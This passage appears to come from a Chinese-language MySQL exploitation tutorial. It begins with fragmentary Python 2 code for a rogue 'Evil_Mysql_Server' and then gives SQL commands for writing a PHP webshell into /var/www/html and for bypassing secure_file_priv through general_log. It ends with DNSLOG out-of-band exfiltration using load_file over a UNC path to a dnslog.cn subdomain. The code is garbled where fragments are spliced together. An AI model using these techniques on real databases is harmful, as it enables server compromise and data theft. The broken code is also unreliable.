        os.setsid()
        if os.fork(): os._exit(0)
        os.umask(0o022)
        null=os.open('/dev/null', os.O_RDWR)
        for i in xrange(3):
            try:
                os.dup2(null, i)
            except OSError as e:
                if e.errno != 9: raise
        os.close(null)
    class LastPacket(Exception):
        pass
    class OutOfOrder(Exception):
        pass
    class mysql_packet(object):
        packet_header = struct.Struct('> 16, 0, self.packet_num)
            result = "{0}{1}".format(
                header,
                self.payload
            )
            return result
        def __repr__(self):
            return repr(str(self))
        @staticmethod
        def parse(raw_data):
            packet_num = ord(raw_data[0])
            payload = raw_data[1:]
            return mysql_packet(packet_num, payload)
    class http_request_handler(asynchat.async_chat):
        def __init__(self, addr):
            asynchat.async_chat.__init__(self, sock=addr[0])
            self.addr = addr[1]
            self.ibuffer = []
            self.set_terminator(3)
            self.state = 'LEN'
            self.sub_state = 'Auth'
            self.logined = False
            self.push(
                mysql_packet(
                    0,
                    "".join((
                        'x0a',  # Protocol
                        '3.0.0-Evil_Mysql_Server' + '',  # Version
                        #'5.1.66-0+squeeze1' + '',
                        'x36x00x00x00',  # Thread ID
                        'evilsalt' + '',  # Salt
                        'xdfxf7',  # Capabilities
                        'x08',  # Collation
                        'x02x00',  # Server Status
                        '' * 13,  # Unknown
                        'evil2222' + '',
                    ))
                )
            )
            self.order = 1
            self.states = ['LOGIN', 'CAPS', 'ANY']
        def push(self, data):
            log.debug('Pushed: %r', data)
            data = str(data)
            asynchat.async_chat.push(self, data)
        def collect_incoming_data(self, data):
            log.debug('Data recved: %r', data)
            self.ibuffer.append(data)
        def found_terminator(self):
            data = "".join(self.ibuffer)
            self.ibuffer = []
            if self.state == 'LEN':
                len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
                if len_bytes " into outfile '/var/www/html/1.php';
    select 2,"" into dumpfile '/var/www/html/1.php';
当secure_file_priv值为NULL时，可用生成日志的方法绕过：
    set global general_log_file = '/var/www/html/1.php';
    set global general_log = on;
日志除了general_log还有其他许多日志，实际场景中需要有足够的写入日志的权限，且需要堆叠注入的条件方可采用该方法，因此利用非常困难。
**5.DNSLOG（OOB注入）**
若用户访问DNS服务器，则会在DNS日志中留下记录。如果请求中带有SQL查询的信息，则信息可被带出到DNS记录中。
利用条件：
1.secure_file_priv为空且有文件读取权限
2.目标为windows（利用了UNC，Linux不可行）
3.无回显且无法时间盲注
利用方法：
可以找一个免费的DNSlog：
进入后可获取一个子域名，执行：
    select load_file(concat('\\',(select database()),'.子域名.dnslog.cn'));
相当于访问了select database().子域名.dnslog.cn，于是会留下DNSLOG记录，可从这些记录中查看SQL返回的信息。